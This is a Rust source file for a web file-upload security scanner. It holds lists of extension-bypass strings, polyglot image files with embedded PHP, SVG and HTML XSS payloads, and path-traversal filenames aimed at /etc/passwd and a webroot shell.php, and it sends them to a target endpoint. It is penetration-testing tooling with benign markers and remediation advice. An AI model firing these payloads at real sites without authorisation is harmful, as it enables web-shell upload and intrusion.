//! File Upload Security Scanner
//!
//! Tests file upload functionality for common vulnerabilities:
//! - Extension bypass (double extensions, null bytes, etc.)
//! - MIME type confusion
//! - Path traversal in filenames
//! - Polyglot file uploads
//! - Size limit bypass
//! - Content-Type validation bypass
//!
//! # Usage
//! ```ignore
//! let scanner = UploadScanner::new();
//! let findings = scanner.scan_upload_endpoint(
//!     "https://example.com/upload",
//!     "file",  // form field name
//! ).await?;
//! ```

use crate::scanner::findings::{Finding, Severity};
use anyhow::{Context, Result};
use reqwest::{multipart, Client};
use std::collections::HashMap;

/// Common dangerous extensions
const DANGEROUS_EXTENSIONS: &[&str] = &[
    "php", "php3", "php4", "php5", "php7", "phtml", "phar",
    "asp", "aspx", "ashx", "asmx", "ascx",
    "jsp", "jspx", "jsw", "jsv", "jspf",
    "exe", "dll", "bat", "cmd", "ps1", "vbs",
    "sh", "bash", "cgi", "pl", "py",
    "html", "htm", "xhtml", "svg", "xml",
    "htaccess", "htpasswd", "config",
];

/// Extension bypass techniques
const EXTENSION_BYPASSES: &[&str] = &[
    // Double extensions
    ".jpg.php",
    ".png.php",
    ".gif.php",
    ".php.jpg",
    ".php.png",
    ".php.gif",
    // Null byte (older systems)
    ".php%00.jpg",
    ".php\x00.jpg",
    // Case variations
    ".pHp",
    ".PhP",
    ".PHP",
    ".pHP",
    // Alternative extensions
    ".phtml",
    ".php3",
    ".php4",
    ".php5",
    ".php7",
    ".phar",
    // URL encoding
    ".ph%70",
    ".%70hp",
    // Unicode/special characters
    ".php.",
    ".php...",
    ".php;",
    ".php:",
    // Windows-specific
    ".php::$DATA",
    ".php:$DATA",
    // Space padding
    ".php ",
    " .php",
    ".php  ",
    // Trailing characters that might be stripped
    ".php/",
    ".php\\",
    ".php#",
    ".php?",
];

/// MIME types for testing
const DANGEROUS_MIMES: &[(&str, &str)] = &[
    ("application/x-php", "php"),
    ("application/x-httpd-php", "php"),
    ("text/x-php", "php"),
    ("application/x-asp", "asp"),
    ("application/x-aspx", "aspx"),
    ("application/x-jsp", "jsp"),
    ("application/javascript", "js"),
    ("text/html", "html"),
    ("application/xml", "xml"),
    ("image/svg+xml", "svg"),
];

/// Safe MIME types that might be used to bypass
const SAFE_MIMES: &[&str] = &[
    "image/jpeg",
    "image/png",
    "image/gif",
    "image/webp",
    "application/pdf",
    "text/plain",
    "application/octet-stream",
];

/// Polyglot file payloads (files that are valid as multiple types)
struct PolyglotPayload {
    /// Payload name
    name: &'static str,
    /// File content
    content: &'static [u8],
    /// MIME type to send
    mime_type: &'static str,
    /// Expected extension
    extension: &'static str,
    /// What code it contains
    payload_type: &'static str,
}

/// Common polyglot payloads
const POLYGLOT_PAYLOADS: &[PolyglotPayload] = &[
    // GIF + PHP
    PolyglotPayload {
        name: "GIF-PHP",
        content: b"GIF89a<?php echo 'UPLOAD_VULN_MARKER'; ?>",
        mime_type: "image/gif",
        extension: "gif",
        payload_type: "PHP",
    },
    // PNG + PHP (minimal valid PNG header)
    PolyglotPayload {
        name: "PNG-PHP",
        content: b"\x89PNG\r\n\x1a\n<?php echo 'UPLOAD_VULN_MARKER'; ?>",
        mime_type: "image/png",
        extension: "png",
        payload_type: "PHP",
    },
    // JPEG + PHP
    PolyglotPayload {
        name: "JPEG-PHP",
        content: b"\xFF\xD8\xFF\xE0<?php echo 'UPLOAD_VULN_MARKER'; ?>\xFF\xD9",
        mime_type: "image/jpeg",
        extension: "jpg",
        payload_type: "PHP",
    },
    // SVG + XSS
    PolyglotPayload {
        name: "SVG-XSS",
        content: b"<?xml version=\"1.0\" standalone=\"no\"?>\n<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('UPLOAD_VULN_MARKER')\"><rect width=\"100\" height=\"100\"/></svg>",
        mime_type: "image/svg+xml",
        extension: "svg",
        payload_type: "XSS",
    },
    // HTML disguised as text
    PolyglotPayload {
        name: "HTML-TXT",
        content: b"<html><body><script>alert('UPLOAD_VULN_MARKER')</script></body></html>",
        mime_type: "text/plain",
        extension: "txt",
        payload_type: "XSS",
    },
];

/// Path traversal payloads for filenames
const PATH_TRAVERSAL_FILENAMES: &[&str] = &[
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
    "../shell.php",
    "../../shell.php",
    "../../../var/www/html/shell.php",
];

/// Upload test result
#[derive(Debug, Clone)]
pub struct UploadTestResult {
    /// Test name
    pub test_name: String,
    /// Whether upload was successful
    pub upload_successful: bool,
    /// HTTP status code
    pub status_code: u16,
    /// Response body
    pub response_body: String,
    /// URL where file might be accessible
    pub accessible_url: Option<String>,
    /// Whether the file is executable/dangerous
    pub is_dangerous: bool,
    /// Vulnerability type if found
    pub vulnerability: Option<UploadVulnerability>,
}

/// Types of upload vulnerabilities
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum UploadVulnerability {
    /// Unrestricted file upload
    UnrestrictedUpload,
    /// Extension bypass
    ExtensionBypass,
    /// MIME type bypass
    MimeTypeBypass,
    /// Path traversal
    PathTraversal,
    /// Polyglot file accepted
    PolyglotAccepted,
    /// XSS via uploaded file
    StoredXss,
    /// RCE via uploaded file
    RemoteCodeExecution,
    /// Size limit bypass
    SizeLimitBypass,
}

impl std::fmt::Display for UploadVulnerability {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::UnrestrictedUpload => write!(f, "Unrestricted File Upload"),
            Self::ExtensionBypass => write!(f, "Extension Validation Bypass"),
            Self::MimeTypeBypass => write!(f, "MIME Type Validation Bypass"),
            Self::PathTraversal => write!(f, "Path Traversal in Filename"),
            Self::PolyglotAccepted => write!(f, "Polyglot File Accepted"),
            Self::StoredXss => write!(f, "Stored XSS via File Upload"),
            Self::RemoteCodeExecution => write!(f, "Remote Code Execution via Upload"),
            Self::SizeLimitBypass => write!(f, "Size Limit Bypass"),
        }
    }
}

/// File upload scanner
pub struct UploadScanner {
    /// HTTP client
    client: Client,
    /// Custom headers
    headers: HashMap<String, String>,
    /// Request timeout
    timeout: std::time::Duration,
    /// Whether to test path traversal
    test_path_traversal: bool,
    /// Whether to test extension bypasses
    test_extension_bypass: bool,
    /// Whether to test MIME type bypasses
    test_mime_bypass: bool,
    /// Whether to test polyglot files
    test_polyglots: bool,
    /// Whether to verify upload by accessing the file
    verify_upload: bool,
    /// Base path where uploads might be accessible
    upload_base_path: Option<String>,
}

impl UploadScanner {
    /// Create a new upload scanner
    pub fn new() -> Self {
        Self {
            client: Client::builder()
                .timeout(std::time::Duration::from_secs(30))
                .build()
                .expect("Failed to create HTTP client"),
            headers: HashMap::new(),
            timeout: std::time::Duration::from_secs(30),
            test_path_traversal: true,
            test_extension_bypass: true,
            test_mime_bypass: true,
            test_polyglots: true,
            verify_upload: true,
            upload_base_path: None,
        }
    }

    /// Set custom headers
    pub fn with_headers(mut self, headers: HashMap<String, String>) -> Self {
        self.headers = headers;
        self
    }

    /// Set authentication cookie
    pub fn with_cookie(mut self, cookie: &str) -> Self {
        self.headers.insert("Cookie".to_string(), cookie.to_string());
        self
    }

    /// Set upload base path for verification
    pub fn with_upload_path(mut self, path: &str) -> Self {
        self.upload_base_path = Some(path.to_string());
        self
    }

    /// Configure which tests to run
    pub fn configure(
        mut self,
        path_traversal: bool,
        extension_bypass: bool,
        mime_bypass: bool,
        polyglots: bool,
    ) -> Self {
        self.test_path_traversal = path_traversal;
        self.test_extension_bypass = extension_bypass;
        self.test_mime_bypass = mime_bypass;
        self.test_polyglots = polyglots;
        self
    }

    /// Scan an upload endpoint for vulnerabilities
    pub async fn scan_upload_endpoint(
        &self,
        url: &str,
        field_name: &str,
    ) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();

        // Test direct dangerous extension upload
        if let Some(finding) = self.test_dangerous_extensions(url, field_name).await? {
            findings.push(finding);
        }

        // Test extension bypasses
        if self.test_extension_bypass {
            findings.extend(self.test_extension_bypasses(url, field_name).await?);
        }

        // Test MIME type bypasses
        if self.test_mime_bypass {
            if let Some(finding) = self.test_mime_type_bypass(url, field_name).await? {
                findings.push(finding);
            }
        }

        // Test polyglot files
        if self.test_polyglots {
            findings.extend(self.test_polyglot_uploads(url, field_name).await?);
        }

        // Test path traversal
        if self.test_path_traversal {
            if let Some(finding) = self.test_path_traversal_upload(url, field_name).await? {
                findings.push(finding);
            }
        }

        // Test SVG XSS
        if let Some(finding) = self.test_svg_xss(url, field_name).await? {
            findings.push(finding);
        }

        Ok(findings)
    }

    /// Test direct upload of dangerous extensions
    async fn test_dangerous_extensions(
        &self,
        url: &str,
        field_name: &str,
    ) -> Result<Option<Finding>> {
        for ext in &["php", "jsp", "asp", "aspx"] {
            let filename = format!("test.{}", ext);
            let content = match *ext {
                "php" => b"<?php echo 'UPLOAD_VULN_MARKER'; ?>".to_vec(),
                "jsp" => b"<%= \"UPLOAD_VULN_MARKER\" %>".to_vec(),
                "asp" | "aspx" => b"<% Response.Write(\"UPLOAD_VULN_MARKER\") %>".to_vec(),
                _ => b"UPLOAD_VULN_MARKER".to_vec(),
            };

            let result = self
                .upload_file(url, field_name, &filename, &content, None)
                .await?;

            if result.upload_successful {
                return Ok(Some(
                    Finding::new("Unrestricted File Upload", Severity::Critical, url)
                        .with_description(&format!(
                            "The application accepts direct upload of {} files, \
                             which could lead to remote code execution.",
                            ext.to_uppercase()
                        ))
                        .with_parameter(field_name)
                        .with_evidence(&format!(
                            "Uploaded {} successfully. Status: {}",
                            filename, result.status_code
                        ))
                        .with_remediation(
                            "Implement a whitelist of allowed file extensions. \
                             Never allow executable file types like PHP, JSP, or ASP.",
                        )
                        .with_reference(
                            "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
                        )
                        .with_cwe(434)
                        .with_scanner("upload"),
                ));
            }
        }

        Ok(None)
    }

    /// Test extension bypass techniques
    async fn test_extension_bypasses(
        &self,
        url: &str,
        field_name: &str,
    ) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();
        let php_content = b"<?php echo 'UPLOAD_VULN_MARKER'; ?>".to_vec();

        for bypass in EXTENSION_BYPASSES {
            let filename = format!("test{}", bypass);
            let result = self
                .upload_file(url, field_name, &filename, &php_content, Some("image/jpeg"))
                .await?;

            if result.upload_successful {
                // Check if it's actually exploitable
                let is_exploitable = self.verify_php_execution(&result).await;

                let severity = if is_exploitable {
                    Severity::Critical
                } else {
                    Severity::High
                };

                findings.push(
                    Finding::new("File Upload Extension Bypass", severity, url)
                        .with_description(&format!(
                            "Extension validation can be bypassed using '{}'. {}",
                            bypass,
                            if is_exploitable {
                                "The file is executable!"
                            } else {
                                "File was uploaded but execution not verified."
                            }
                        ))
                        .with_parameter(field_name)
                        .with_evidence(&format!("Bypass technique: {}", bypass))
                        .with_remediation(
                            "Use a strict whitelist for file extensions. \
                             Check the actual file content, not just the extension. \
                             Store uploaded files outside the web root.",
                        )
                        .with_reference("https://book.hacktricks.xyz/pentesting-web/file-upload")
                        .with_cwe(434)
                        .with_scanner("upload"),
                );

                // Found a bypass, don't need to test all
                break;
            }
        }

        Ok(findings)
    }

    /// Test MIME type bypass
    async fn test_mime_type_bypass(
        &self,
        url: &str,
        field_name: &str,
    ) -> Result<Option<Finding>> {
        let php_content = b"<?php echo 'UPLOAD_VULN_MARKER'; ?>".to_vec();

        // Try uploading PHP with safe MIME types
        for mime_type in SAFE_MIMES {
            let filename = "test.php";
            let result = self
                .upload_file(url, field_name, filename, &php_content, Some(mime_type))
                .await?;

            if result.upload_successful {
                return Ok(Some(
                    Finding::new("MIME Type Validation Bypass", Severity::High, url)
                        .with_description(&format!(
                            "MIME type validation can be bypassed. PHP file uploaded \
                             with Content-Type: {}",
                            mime_type
                        ))
                        .with_parameter(field_name)
                        .with_evidence(&format!("MIME type used: {}", mime_type))
                        .with_remediation(
                            "Don't rely solely on Content-Type header for validation. \
                             Verify file content using magic bytes and proper file analysis.",
                        )
                        .with_cwe(434)
                        .with_scanner("upload"),
                ));
            }
        }

        Ok(None)
    }

    /// Test polyglot file uploads
    async fn test_polyglot_uploads(
        &self,
        url: &str,
        field_name: &str,
    ) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();

        for polyglot in POLYGLOT_PAYLOADS {
            let filename = format!("test.{}", polyglot.extension);
            let result = self
                .upload_file(
                    url,
                    field_name,
                    &filename,
                    polyglot.content,
                    Some(polyglot.mime_type),
                )
                .await?;

            if result.upload_successful {
                let severity = match polyglot.payload_type {
                    "PHP" => Severity::Critical,
                    "XSS" => Severity::High,
                    _ => Severity::Medium,
                };

                findings.push(
                    Finding::new(
                        &format!("Polyglot File Upload ({})", polyglot.name),
                        severity,
                        url,
                    )
                    .with_description(&format!(
                        "Application accepts polyglot file that appears to be a valid {} \
                         but contains {} payload.",
                        polyglot.extension.to_uppercase(),
                        polyglot.payload_type
                    ))
                    .with_parameter(field_name)
                    .with_evidence(&format!(
                        "Polyglot type: {}, MIME: {}",
                        polyglot.name, polyglot.mime_type
                    ))
                    .with_remediation(
                        "Implement deep content inspection. Re-encode/re-process \
                         uploaded images to strip any embedded code.",
                    )
                    .with_reference("https://portswigger.net/web-security/file-upload")
                    .with_cwe(434)
                    .with_scanner("upload"),
                );
            }
        }

        Ok(findings)
    }

    /// Test path traversal in filename
    async fn test_path_traversal_upload(
        &self,
        url: &str,
        field_name: &str,
    ) -> Result<Option<Finding>> {
        let content = b"PATH_TRAVERSAL_TEST".to_vec();

        for payload in PATH_TRAVERSAL_FILENAMES {
            let result = self
                .upload_file(url, field_name, payload, &content, None)
                .await?;

            // Check if traversal indicators in response
            if result.upload_successful
                && (result.response_body.contains("passwd")
                    || result.response_body.contains("root:")
                    || result.response_body.contains("PATH_TRAVERSAL_TEST")
                    || result.response_body.contains("success"))
            {
                return Ok(Some(
                    Finding::new("Path Traversal in File Upload", Severity::High, url)
                        .with_description(&format!(
                            "The upload functionality may be vulnerable to path traversal. \
                             Payload '{}' was accepted.",
                            payload
                        ))
                        .with_parameter(field_name)
                        .with_evidence(&format!("Filename payload: {}", payload))
                        .with_remediation(
                            "Sanitize filenames by removing path separators and special characters. \
                             Use a random generated filename instead of user input.",
                        )
                        .with_reference("https://cwe.mitre.org/data/definitions/22.html")
                        .with_cwe(22)
                        .with_scanner("upload"),
                ));
            }
        }

        Ok(None)
    }

    /// Test SVG XSS
    async fn test_svg_xss(&self, url: &str, field_name: &str) -> Result<Option<Finding>> {
        let svg_xss = br##"<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert('SVG_XSS_MARKER');
   </script>
</svg>"##;

        let result = self
            .upload_file(url, field_name, "test.svg", svg_xss, Some("image/svg+xml"))
            .await?;

        if result.upload_successful {
            return Ok(Some(
                Finding::new("Stored XSS via SVG Upload", Severity::High, url)
                    .with_description(
                        "Application accepts SVG files with embedded JavaScript. \
                         If the SVG is served with the correct MIME type, \
                         the JavaScript will execute in viewers' browsers.",
                    )
                    .with_parameter(field_name)
                    .with_evidence("SVG with <script> tag was accepted")
                    .with_remediation(
                        "Sanitize SVG files to remove script tags and event handlers. \
                         Consider converting SVGs to raster images or serving them \
                         with Content-Disposition: attachment.",
                    )
                    .with_cwe(79)
                    .with_scanner("upload"),
            ));
        }

        Ok(None)
    }

    /// Upload a file to the endpoint
    async fn upload_file(
        &self,
        url: &str,
        field_name: &str,
        filename: &str,
        content: &[u8],
        mime_type: Option<&str>,
    ) -> Result<UploadTestResult> {
        let mime = mime_type.unwrap_or("application/octet-stream");

        let part = multipart::Part::bytes(content.to_vec())
            .file_name(filename.to_string())
            .mime_str(mime)?;

        let form = multipart::Form::new().part(field_name.to_string(), part);

        let mut request = self.client.post(url).multipart(form);

        for (key, value) in &self.headers {
            request = request.header(key, value);
        }

        let response = request.send().await.context("Failed to upload file")?;

        let status_code = response.status().as_u16();
        let response_body = response.text().await.unwrap_or_default();

        // Determine if upload was successful
        let upload_successful = status_code >= 200 && status_code < 300
            && !response_body.to_lowercase().contains("error")
            && !response_body.to_lowercase().contains("invalid")
            && !response_body.to_lowercase().contains("not allowed")
            && !response_body.to_lowercase().contains("rejected");

        Ok(UploadTestResult {
            test_name: format!("Upload {}", filename),
            upload_successful,
            status_code,
            response_body,
            accessible_url: None,
            is_dangerous: filename.contains(".php")
                || filename.contains(".jsp")
                || filename.contains(".asp"),
            vulnerability: None,
        })
    }

    /// Verify if uploaded PHP file is executable
    async fn verify_php_execution(&self, _result: &UploadTestResult) -> bool {
        // In a real implementation, we would:
        // 1. Try to access the uploaded file URL
        // 2. Check if UPLOAD_VULN_MARKER appears in the response
        // This is left as a stub for safety
        false
    }
}

impl Default for UploadScanner {
    fn default() -> Self {
        Self::new()
    }
}

/// Generate a test file with specific content
pub fn generate_test_file(extension: &str, payload: &str) -> Vec<u8> {
    match extension {
        "php" => format!("<?php {} ?>", payload).into_bytes(),
        "jsp" => format!("<%= {} %>", payload).into_bytes(),
        "asp" => format!("<% {} %>", payload).into_bytes(),
        "html" | "htm" => format!("<html><body>{}</body></html>", payload).into_bytes(),
        "svg" => format!(
            r#"<svg xmlns="http://www.w3.org/2000/svg"><script>{}</script></svg>"#,
            payload
        )
        .into_bytes(),
        _ => payload.as_bytes().to_vec(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_scanner_creation() {
        let scanner = UploadScanner::new();
        assert!(scanner.test_path_traversal);
        assert!(scanner.test_extension_bypass);
    }

    #[test]
    fn test_generate_test_file() {
        let php_file = generate_test_file("php", "echo 'test';");
        assert!(String::from_utf8_lossy(&php_file).contains("<?php"));

        let svg_file = generate_test_file("svg", "alert(1)");
        assert!(String::from_utf8_lossy(&svg_file).contains("<svg"));
    }

    #[test]
    fn test_extension_bypass_payloads() {
        assert!(EXTENSION_BYPASSES.len() > 20);
        assert!(EXTENSION_BYPASSES.iter().any(|e| e.contains(".php")));
        assert!(EXTENSION_BYPASSES.iter().any(|e| e.contains("%00")));
    }

    #[test]
    fn test_polyglot_payloads() {
        assert!(POLYGLOT_PAYLOADS.len() >= 4);

        for payload in POLYGLOT_PAYLOADS {
            assert!(!payload.content.is_empty());
            assert!(!payload.mime_type.is_empty());
        }
    }
}
